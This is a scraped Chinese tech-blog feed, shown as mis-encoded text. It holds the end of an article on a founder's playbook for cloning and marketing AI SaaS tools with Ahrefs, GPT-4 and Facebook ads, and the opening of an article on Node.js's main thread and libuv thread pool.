<p><strong>åä¾‹/å‘ï¼š</strong> å¦‚æœæµé‡ 90% ä»¥ä¸Šéƒ½é ç ¸é’±ä¹°å¹¿å‘Šï¼Œè¯´æ˜äº§å“æœ¬èº«å¯èƒ½æ²¡å•¥ç«äº‰åŠ›ã€‚<br/>
è¿™ç§é¡¹ç›®ï¼Œå°±åƒæ— åº•æ´ï¼Œçƒ§å†å¤šé’±ä¹Ÿå¬ä¸è§å“ã€‚</p>
</li>
<li>
<p><strong>å¯å¤åˆ¶æ¨¡æ¿ï¼š</strong></p>
</li>
</ul>
<ol>
<li>
<p>æ‰“å¼€ Ahrefsï¼Œè¾“å…¥ç«å“åŸŸå</p>
</li>
<li>
<p>é‡ç‚¹å…³æ³¨ â€œOrganic Keywordsâ€ å’Œ â€œPaid Keywordsâ€ è¿™ä¸¤é¡¹æŒ‡æ ‡</p>
</li>
</ol>
<h3 data-id="heading-5">Step 3ï¼šAI åŠ æŒï¼Œå…‰é€Ÿ â€œå…‹éš†â€</h3>
<ul>
<li><strong>è§¦å‘åœºæ™¯ï¼š</strong> ç¡®å®šäº§å“æ–¹å‘å</li>
<li><strong>å…·ä½“åŠ¨ä½œï¼š</strong></li>
</ul>
<ol>
<li>
<p>ç”¨ Mobbin æ”¶é›†ç«å“ Landing Page æˆªå›¾</p>
</li>
<li>
<p>æŠŠæˆªå›¾æ‰”ç»™ GPT-4ï¼Œé—®ï¼š &gt; â€œè¯·å¸®æˆ‘åˆ†æè¿™ä¸ª Landing Page çš„ç»“æ„å’Œæ–‡æ¡ˆï¼Œå¹¶ç»™å‡ºä¸€ä¸ªæ”¹è¿›ç‰ˆæœ¬ï¼Œè®©è½¬åŒ–ç‡æå‡ 5%ã€‚â€</p>
</li>
<li>
<p>æ ¹æ® GPT-4 çš„å»ºè®®ï¼Œç”¨ Next.js + NodeJS å¿«é€Ÿæ­å»ºä¸€ä¸ª MVP</p>
</li>
</ol>
<ul>
<li>
<p><strong>åˆ¤æ–­æ ‡å‡†ï¼š</strong> MVP èƒ½å¦è·‘é€šæ ¸å¿ƒæµç¨‹ï¼Ÿç”¨æˆ·æ˜¯å¦æ„¿æ„ä¸ºä¹‹ä»˜è´¹ï¼Ÿ</p>
</li>
<li>
<p><strong>åä¾‹/å‘ï¼š</strong> ä¸è¦ä¸€å¼€å§‹å°±è¿½æ±‚å®Œç¾ï¼Œå…ˆæŠŠæ ¸å¿ƒåŠŸèƒ½åšå‡ºæ¥ï¼Œè·‘é€šæµç¨‹æœ€é‡è¦ã€‚<br/>
<strong>Samuelï¼š</strong> â€œè·³è¿‡é‚£äº›æ— èŠçš„å¯†ç é‡ç½®ã€è®¾ç½®é¡µé¢ï¼Œå…ˆè®©äº§å“è·‘èµ·æ¥å†è¯´ï¼å®Œç¾ä¸»ä¹‰è¦ä¸å¾—ã€‚â€</p>
</li>
<li>
<p><strong>å¯å¤åˆ¶æ¨¡æ¿ï¼š</strong></p>
</li>
</ul>
<ol>
<li>
<p>æ‰“å¼€ Mobbinï¼Œæœç´¢ç«å“å…³é”®è¯</p>
</li>
<li>
<p>ç”¨ GPT-4 åˆ†æç«å“ Landing Page</p>
</li>
<li>
<p>ç”¨ Next.js + NodeJS æ­å»º MVP</p>
</li>
</ol>
<h3 data-id="heading-6">Step 4ï¼šFacebook Ads éªŒè¯ MVP</h3>
<ul>
<li><strong>è§¦å‘åœºæ™¯ï¼š</strong> MVP å®Œæˆå</li>
<li><strong>å…·ä½“åŠ¨ä½œï¼š</strong></li>
</ul>
<ol>
<li>
<p>åœ¨ Facebook Ads Manager åˆ›å»ºå¹¿å‘Šç³»åˆ—</p>
</li>
<li>
<p>è®¾ç½®å—ä¼—å®šä½ã€é¢„ç®—å’ŒæŠ•æ”¾æ—¶é—´</p>
</li>
</ol>
<ul>
<li>
<p><strong>åˆ¤æ–­æ ‡å‡†ï¼š</strong></p>
</li>
<li>
<ul>
<li>
<p>CTRï¼ˆç‚¹å‡»ç‡ï¼‰æ˜¯å¦é«˜äº 1%ï¼Ÿ</p>
</li>
<li>
<p>è½¬åŒ–ç‡æ˜¯å¦é«˜äº 2%ï¼Ÿ</p>
</li>
</ul>
</li>
<li>
<p><strong>åä¾‹/å‘ï¼š</strong> ä¸è¦ç›²ç›®ç ¸é’±ï¼Œè¦ç”¨å°é¢„ç®—è¿›è¡Œæµ‹è¯•ï¼Œæ ¹æ®æ•°æ®è°ƒæ•´ã€‚<br/>
<strong>Samuelï¼š</strong> â€œFacebook Ads å°±åƒä¸€ä¸ªé»‘ç›’å­ï¼Œä½ æ°¸è¿œä¸çŸ¥é“é’±ä¼šçƒ§åˆ°å“ªé‡Œå»ã€‚æ‰€ä»¥ä¸€å®šè¦æ§åˆ¶é¢„ç®—ï¼Œå°æ­¥å¿«è·‘ã€‚â€</p>
</li>
<li>
<p><strong>å¯å¤åˆ¶æ¨¡æ¿ï¼š</strong></p>
</li>
</ul>
<ol>
<li>
<p>åˆ›å»º Facebook å¹¿å‘Šç³»åˆ—</p>
</li>
<li>
<p>è®¾ç½® 100 ç¾å…ƒ/å¤©çš„æµ‹è¯•é¢„ç®—</p>
</li>
</ol>
<h2 data-id="heading-7">AI æ˜¯æ€ä¹ˆè¢«ä»–å½“â€œç”Ÿäº§å·¥å…·â€ç”¨çš„ï¼š</h2>
<ul>
<li>
<p><strong>ç”¨ GPT-4 ä¼˜åŒ–æ–‡æ¡ˆï¼š</strong><br/>
<strong>Promptï¼š</strong> â€œå¸®æˆ‘æŠŠè¿™æ®µæ–‡æ¡ˆæ”¹å¾—æ›´å¸å¼•äººï¼Œè®©ç”¨æˆ·å¿ä¸ä½ç‚¹å‡»ã€‚â€</p>
</li>
<li>
<ul>
<li><strong>è½åœ°ï¼š</strong> æŠŠ GPT-4 æ¶¦è‰²åçš„æ–‡æ¡ˆï¼Œç›´æ¥ç”¨åˆ° Landing Page å’Œå¹¿å‘Šæ–‡æ¡ˆä¸Šï¼Œ<strong>A/B Test å“ªä¸ªæ•ˆæœå¥½ç”¨å“ªä¸ª</strong>ã€‚</li>
</ul>
</li>
<li>
<p><strong>ç”¨ AI è‡ªåŠ¨ç”Ÿæˆæµ‹è¯•ç´ æï¼š</strong><br/>
<strong>Promptï¼š</strong> â€œå¸®æˆ‘ç”Ÿæˆ 5 å¼ ä¸åŒé£æ ¼çš„äº§å“å›¾ï¼Œç”¨äº A/B æµ‹è¯•ã€‚â€</p>
</li>
<li>
<ul>
<li><strong>è½åœ°ï¼š</strong> ç”¨ AI ç”Ÿæˆçš„å›¾ç‰‡ï¼Œæ›¿æ¢æ‰ Landing Page ä¸Šçš„æ—§å›¾ï¼Œçœ‹å“ªä¸ªè½¬åŒ–ç‡æ›´é«˜ã€‚</li>
</ul>
</li>
</ul>
<h2 data-id="heading-8">æ—¶é—´çº¿ï¼š</h2>
<ul>
<li><strong>ç¬¬ 1 å¤©ï¼š</strong> åœ¨ Twitter å‘ç° StoryShort çš„å¸–å­ï¼Œçœ‹åˆ°æ•°æ®å¾ˆç–¯ç‹‚ï¼Œç«‹åˆ» Mark</li>
<li><strong>ç¬¬ 3 å¤©ï¼š</strong> ç”¨ Ahrefs åˆ†æ StoryShort çš„æµé‡æ¥æºï¼Œå‘ç° 100% æ¥è‡ª Facebook å¹¿å‘Šï¼Œè¯´æ˜æœ‰æå¤´ï¼</li>
<li><strong>ç¬¬ 7 å¤©ï¼š</strong> GPT-4 è¾…åŠ©ï¼Œå¿«é€Ÿæ­å»º MVP</li>
<li><strong>ç¬¬ 14 å¤©ï¼š</strong> Facebook Ads ä¸Šçº¿ï¼Œå¼€å§‹è·å–ç”¨æˆ·åé¦ˆ</li>
</ul>
<h2 data-id="heading-9">â€œ1% æ”¹è¿›â€ ä¸æ˜¯å£å·ï¼Œæ˜¯çœŸåˆ€çœŸæªçš„ç»†èŠ‚ï¼š</h2>
<p>StoryShort çš„æ ¸å¿ƒåŠŸèƒ½æ˜¯è‡ªåŠ¨å‘å¸ƒ Faceless Videoã€‚</p>
<ul>
<li><strong>ç«å“ç—›ç‚¹ï¼š</strong> ç”¨æˆ·ç»å¸¸ä¸çŸ¥é“è¯¥å‘ä»€ä¹ˆå†…å®¹ï¼Œæ²¡çµæ„Ÿã€‚</li>
<li><strong>Samuel çš„æ”¹è¿›ï¼š</strong> åŠ äº†ä¸€ä¸ª â€œUGC è§†é¢‘çµæ„Ÿåº“â€ï¼Œæ¯å¤©æ›´æ–° 100 ä¸ªçƒ­é—¨è¯é¢˜ï¼Œè®©ç”¨æˆ·ä¸å†ä¸ºå†…å®¹å‘æ„ã€‚</li>
<li><strong>æ•ˆæœï¼š</strong> ç”¨æˆ·æ´»è·ƒåº¦ç›´æ¥æå‡ 30%ã€‚</li>
</ul>
<h2 data-id="heading-10">å•†ä¸šé€»è¾‘ä¸å¢é•¿é¡ºåºï¼š</h2>
<p>Samuel çš„å¢é•¿ç­–ç•¥éå¸¸æ¸…æ™°ï¼Œæ¯ä¸ªé˜¶æ®µéƒ½æœ‰æ˜ç¡®çš„ç›®æ ‡å’Œæ‰“æ³•ã€‚</p>
<ol>
<li><strong>å¹¿å‘Šï¼ˆGoogle / Metaï¼‰ï¼š</strong></li>
</ol>
<ul>
<li>
<p><strong>ä¸ºä»€ä¹ˆæœ€å¿«éªŒè¯ï¼Ÿ</strong> å¿«é€Ÿè·å–ç”¨æˆ·åé¦ˆï¼ŒéªŒè¯äº§å“æ˜¯å¦å—æ¬¢è¿ã€‚</p>
</li>
<li>
<p><strong>å¦‚ä½•å°é¢æµ‹è¯•ï¼Ÿ</strong> æ¯å¤© 100 ç¾å…ƒé¢„ç®—ï¼Œæµ‹è¯•ä¸åŒå—ä¼—å’Œæ–‡æ¡ˆã€‚</p>
</li>
<li>
<p><strong>æ€ä¹ˆåˆ¤æ–­ç»§ç»­/åœï¼Ÿ</strong> CTR &gt; 1%ï¼Œè½¬åŒ–ç‡ &gt; 2%ï¼Œå°±åŠ å¤§æŠ•å…¥ï¼›å¦åˆ™ï¼Œç«‹åˆ»åœæ­¢ã€‚</p>
</li>
</ul>
<ol>
<li><strong>SEOï¼š</strong></li>
</ol>
<ul>
<li>
<p><strong>ä¸ºä»€ä¹ˆæ˜¯å¤åˆ©ï¼Ÿ</strong> é•¿æœŸç§¯ç´¯ï¼Œå¸¦æ¥æŒç»­ä¸æ–­çš„å…è´¹æµé‡ã€‚</p>
</li>
<li>
<p><strong>ä»–ç”¨ä»€ä¹ˆå·¥å…·çœ‹ä»€ä¹ˆï¼Ÿ</strong> Ahrefs çœ‹å…³é”®è¯æ’åï¼ŒOutrank.so è‡ªåŠ¨ç”Ÿæˆ SEO æ–‡ç« ã€‚</p>
</li>
<li>
<p><strong>AI å†™å†…å®¹å¦‚ä½•è‡ªåŠ¨åŒ–ï¼Ÿ</strong><br/>
<strong>Samuelï¼š</strong> â€œç”¨ Outrank.soï¼Œå®ƒå¯ä»¥è‡ªåŠ¨ç”Ÿæˆæ–‡ç« ï¼Œå‘å¸ƒåˆ°åšå®¢ä¸Šï¼Œè§£æ”¾åŒæ‰‹ã€‚â€</p>
</li>
</ul>
<ol>
<li><strong>Faceless YouTube/TikTok/IGï¼š</strong></li>
</ol>
<ul>
<li>
<p><strong>ä¸ºä»€ä¹ˆèƒ½æŒç»­åˆ¶é€ æ³¨æ„åŠ›ï¼Ÿ</strong> æ¯å¤©è‡ªåŠ¨å‘å¸ƒ UGC é£æ ¼çš„è§†é¢‘ï¼Œå¸å¼•æ½œåœ¨ç”¨æˆ·ã€‚</p>
</li>
<li>
<p><strong>å¦‚ä½•è¿è½¬ï¼Ÿ</strong> StoryShort æœ‰ä¸ª â€œè‡ªåŠ¨å‘å¸ƒâ€ åŠŸèƒ½ï¼Œæ¯å¤©è‡ªåŠ¨æŠŠè§†é¢‘å‘å¸ƒåˆ°å„ä¸ªå¹³å°ã€‚</p>
</li>
</ul>
<ol>
<li><strong>Affiliateï¼š</strong></li>
</ol>
<ul>
<li>
<p><strong>ä¸ºä»€ä¹ˆæ˜¯å›ºå®šæˆæœ¬è·å®¢ + è‡ªå¸¦ä¼ æ’­ï¼Ÿ</strong> è”ç›Ÿä¼šå‘˜å¸®ä½ åšå†…å®¹ï¼Œå¸¦æ¥æ›´å¤šæ›å…‰å’Œç”¨æˆ·ã€‚</p>
</li>
<li>
<p><strong>ä¸ºä»€ä¹ˆæœ‰äººæ„¿æ„å¸®ä½ åšå†…å®¹ï¼Ÿ</strong> StoryShort ç»™è”ç›Ÿä¼šå‘˜æä¾›é«˜é¢ä½£é‡‘ï¼Œå¸å¼•ä»–ä»¬åˆ›ä½œå†…å®¹ã€‚</p>
</li>
</ul>
<p>ä»–ä¼šä½¿ç”¨ <strong>SiteData</strong> æŸ¥çœ‹ç›®æ ‡ç½‘ç«™çš„æµé‡è¶‹åŠ¿ã€DRã€ä¸»è¦å¹¿å‘Šå•†å’Œ AdSense å…³è”ç«™ç‚¹ï¼Œä»¥ç¡®è®¤è¿™ä¸ªå¸‚åœºæ˜¯å¦å€¼å¾—æŠ•å…¥ï¼Œå¹¶ä½œä¸ºå¢é•¿ç­–ç•¥çš„é‡è¦å‚è€ƒã€‚</p>
<h2 data-id="heading-11">æˆæœ¬ä¸åˆ©æ¶¦æ„Ÿï¼š</h2>
<ul>
<li>Usimusï¼šæ¯æœˆæˆæœ¬ 4000 ç¾å…ƒï¼ˆä¸»è¦æ˜¯æœåŠ¡å™¨è´¹ç”¨ï¼‰</li>
<li>StoryShortï¼šæ¯æœˆæˆæœ¬ 5000 ç¾å…ƒ</li>
<li>Capacityï¼šæˆæœ¬ä¸ç¡®å®šï¼Œä½†åº”è¯¥ä¸ä½ï¼ˆéœ€è¦å¤§é‡æœåŠ¡å™¨èµ„æºï¼‰</li>
</ul>
<blockquote>
<p><strong>ä¸€å¥è¯ï¼š</strong> SaaS çœ‹èµ·æ¥å¾ˆæ€§æ„Ÿï¼Œä½†æˆæœ¬ä¹Ÿä¸ä½ï¼Œå…¥å‘éœ€è°¨æ…ã€‚</p>
</blockquote>
<h2 data-id="heading-12">å·¥å…·ç®± / æŠ€æœ¯æ ˆï¼š</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fc19200110e4420b904d1d70e104f0f3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aWt54m556iAQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766381460&amp;x-signature=WMr%2BVg2Iw1j31JSLapwa96XR8pU%3D" alt="" loading="lazy"/></p>
<ul>
<li>NextJS</li>
<li>NodeJS</li>
<li>Ahrefs</li>
<li>Outrank.so</li>
<li>Vercel</li>
<li>Stripe</li>
<li>Mobbin</li>
<li>GPT-4</li>
<li>SiteData</li>
</ul>
<h2 data-id="heading-13">ç»“å°¾ï¼š7 æ­¥ SOP è¡ŒåŠ¨æŒ‡å—</h2>
<ol>
<li><strong>è¹²æœºä¼šï¼š</strong> æ¯å¤©èŠ± 30 åˆ†é’Ÿï¼Œåœ¨ Twitterã€Reddit ç­‰å¹³å°ï¼Œå¯»æ‰¾æœ‰æ½œåŠ›çš„ AI åº”ç”¨</li>
<li><strong>ç»†åˆ†èµ›é“ï¼š</strong> ç”¨ SiteData åˆ†æç«å“ç½‘ç«™æ•°æ®ï¼ŒéªŒè¯å¸‚åœºæ½œåŠ›</li>
<li><strong>æ‰’æµé‡ï¼š</strong> ç”¨ Ahrefs åˆ†æç«å“æµé‡æ¥æºå’Œå…³é”®è¯</li>
<li><strong>æ‹†æµç¨‹ï¼š</strong> æ³¨å†Œä½“éªŒç«å“ï¼Œæˆªå›¾åˆ†æå…¶ç”¨æˆ·æµç¨‹</li>
<li><strong>ç”¨ AI æŠ„ï¼š</strong> ç”¨ AI ç¼–ç å·¥å…·å¿«é€Ÿæ­å»º MVP</li>
<li><strong>å°é¢æµ‹ï¼š</strong> åœ¨ Facebookã€Google ç­‰å¹³å°æŠ•æ”¾å°é¢å¹¿å‘Š</li>
<li><strong>å»ºé£è½®ï¼š</strong> æ­å»º SEOã€å†…å®¹è¥é”€ã€è”ç›Ÿè¥é”€ç­‰å¢é•¿æ¸ é“</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ğŸ¨ åŸºç¡€è®¤çŸ¥ç¯‡ï¼šæ‰“ç ´å•çº¿ç¨‹è¯¯åŒº]]></title>    <link>https://juejin.cn/post/7583878719543115785</link>    <guid>https://juejin.cn/post/7583878719543115785</guid>    <pubDate>2025-12-15T08:08:49.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583878719543115785" data-draft-id="7583707681002766382" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ğŸ¨ åŸºç¡€è®¤çŸ¥ç¯‡ï¼šæ‰“ç ´å•çº¿ç¨‹è¯¯åŒº"/> <meta itemprop="keywords" content="Node.js"/> <meta itemprop="datePublished" content="2025-12-15T08:08:49.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Anita_Sun"/> <meta itemprop="url" content="https://juejin.cn/user/1811635884786839"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ğŸ¨ åŸºç¡€è®¤çŸ¥ç¯‡ï¼šæ‰“ç ´å•çº¿ç¨‹è¯¯åŒº
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1811635884786839/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Anita_Sun
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-15T08:08:49.000Z" title="Mon Dec 15 2025 08:08:49 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»13åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">åŸºç¡€è®¤çŸ¥ç¯‡ï¼šæ‰“ç ´å•çº¿ç¨‹è¯¯åŒº</h2>
<p>æåŠNode.jså¹¶å‘æ¨¡å‹ï¼Œâ€œå•çº¿ç¨‹â€æ˜¯æœ€æ·±å…¥äººå¿ƒçš„æ ‡ç­¾ï¼Œä¹Ÿæ˜¯æœ€å®¹æ˜“å¼•å‘è¯¯è§£çš„æ¦‚å¿µã€‚å¾ˆå¤šå¼€å‘è€…å› â€œå•çº¿ç¨‹â€æ ‡ç­¾ï¼Œè¯¯å°†å…¶ç­‰åŒäºâ€œå…¨ç¨‹å•çº¿ç¨‹æ‰§è¡Œâ€ï¼Œæœ€ç»ˆåœ¨CPUå¯†é›†ä»»åŠ¡å¤„ç†ä¸­é­é‡æœåŠ¡å¡é¡¿ã€å“åº”è¶…æ—¶ç­‰æ•…éšœã€‚</p>
<p>æœ¬ç¯‡ç« çš„æ ¸å¿ƒç›®æ ‡ï¼Œå°±æ˜¯æ’•å¼€â€œå•çº¿ç¨‹â€çš„è¡¨é¢æ ‡ç­¾ï¼Œå˜æ¸…Node.jså¹¶å‘æ¨¡å‹çš„çœŸå®æ„æˆï¼Œæ˜ç¡®çº¿ç¨‹æ± çš„æ ¸å¿ƒä»·å€¼ä¸é€‚ç”¨è¾¹ç•Œâ€”â€”è¿™æ˜¯åç»­æŒæ¡çº¿ç¨‹æ± åŸç†ä¸å®æˆ˜çš„åŸºç¡€ï¼Œä¹Ÿæ˜¯é¿å…çº¿ä¸Šæ•…éšœçš„å…³é”®å‰æã€‚</p>
<h3 data-id="heading-1">1.1 Node.js å¹¶å‘æ¨¡å‹çœŸç›¸ï¼šå•çº¿ç¨‹ä¸å¤šçº¿ç¨‹çš„ååŒ</h3>
<p>â€œNode.jsæ˜¯å•çº¿ç¨‹â€çš„è¯´æ³•ï¼Œä¸¥æ ¼æ„ä¹‰ä¸Šåªå¯¹äº†ä¸€åŠï¼š<strong>ä¸»çº¿ç¨‹æ˜¯å•çº¿ç¨‹ï¼Œä½†æ•´ä¸ªNode.jsè¿è¡Œæ—¶æ˜¯å¤šçº¿ç¨‹ååŒå·¥ä½œçš„</strong>ã€‚å¾ˆå¤šå¼€å‘è€…çš„è®¤çŸ¥è¯¯åŒºï¼Œæ°æ°æ˜¯æ··æ·†äº†â€œä¸»çº¿ç¨‹â€ä¸â€œè¿è¡Œæ—¶â€çš„æ¦‚å¿µï¼Œå¿½ç•¥äº†å¤šçº¿ç¨‹ç»„ä»¶çš„å­˜åœ¨ä¸ä»·å€¼ã€‚</p>
<h4 data-id="heading-2">1.1.1 è¢«è¯¯è§£çš„â€œå•çº¿ç¨‹â€ï¼šä¸»çº¿ç¨‹çš„æ ¸å¿ƒèŒè´£</h4>
<p>Node.jsçš„â€œå•çº¿ç¨‹â€ç‰¹æŒ‡<strong>JavaScriptä¸»çº¿ç¨‹</strong>ï¼Œå®ƒæ˜¯æ•´ä¸ªæœåŠ¡çš„è°ƒåº¦æ ¸å¿ƒï¼Œä¸»è¦è´Ÿè´£ä¸‰ç±»å·¥ä½œï¼š</p>
<ul>
<li>æ‰§è¡Œç”¨æˆ·ç¼–å†™çš„JavaScriptä»£ç ï¼ˆå¦‚æ¥å£é€»è¾‘ã€ä¸šåŠ¡è®¡ç®—ï¼‰ï¼›</li>
<li>ç®¡ç†EventLoopï¼ˆäº‹ä»¶å¾ªç¯ï¼‰ï¼Œè°ƒåº¦å¼‚æ­¥ä»»åŠ¡çš„æ‰§è¡Œé¡ºåºï¼›</li>
<li>å¤„ç†DOMæ“ä½œï¼ˆä»…å‰ç«¯Node.jsåœºæ™¯ï¼Œå¦‚Electronï¼‰ã€‚</li>
</ul>
<p>ä¸»çº¿ç¨‹çš„â€œå•çº¿ç¨‹â€ç‰¹æ€§ï¼Œå†³å®šäº†å®ƒæ— æ³•å¹¶è¡Œæ‰§è¡ŒJavaScriptä»£ç â€”â€”åŒä¸€æ—¶é—´åªèƒ½å¤„ç†ä¸€ä¸ªä»»åŠ¡ã€‚</p>
<h4 data-id="heading-3">1.1.2 éšè—çš„â€œå¤šçº¿ç¨‹â€ï¼šNode.jsçš„è¾…åŠ©çº¿ç¨‹ä½“ç³»</h4>
<p>ä¸ºå¼¥è¡¥ä¸»çº¿ç¨‹å•çº¿ç¨‹çš„çŸ­æ¿ï¼ŒNode.jsé€šè¿‡åº•å±‚ç»„ä»¶æä¾›äº†å¤šçº¿ç¨‹èƒ½åŠ›ï¼Œæ ¸å¿ƒåˆ†ä¸ºä¸¤ç±»ï¼Œåˆ†åˆ«åº”å¯¹ä¸åŒåœºæ™¯ï¼š</p>
<ol>
<li>
<p><strong>libuvçº¿ç¨‹æ± </strong>ï¼šç”±Cè¯­è¨€ç¼–å†™çš„libuvåº“æä¾›ï¼Œé»˜è®¤åˆ›å»º4ä¸ªçº¿ç¨‹ï¼ˆå¯é€šè¿‡<code>UV_THREADPOOL_SIZE</code>é…ç½®ï¼‰ï¼Œä¸»è¦è´Ÿè´£å¤„ç†â€œä¸»çº¿ç¨‹æ— æ³•ç›´æ¥å¤„ç†çš„å¼‚æ­¥ä»»åŠ¡â€ï¼ŒåŒ…æ‹¬ï¼š</p>
<blockquote>
<ol>
<li>æ–‡ä»¶I/Oæ“ä½œï¼ˆå¦‚è¯»å†™æœ¬åœ°æ–‡ä»¶ï¼‰ï¼›</li>
<li>DNSæŸ¥è¯¢ï¼ˆå¦‚<code>dns.lookup</code>ï¼‰ï¼›</li>
<li>åŠ å¯†è§£å¯†æ“ä½œï¼ˆå¦‚<code>crypto</code>æ¨¡å—çš„éƒ¨åˆ†APIï¼‰ï¼›</li>
<li>å‹ç¼©è§£å‹æ“ä½œï¼ˆå¦‚<code>zlib</code>æ¨¡å—ï¼‰ã€‚</li>
</ol>
</blockquote>
</li>
<li>
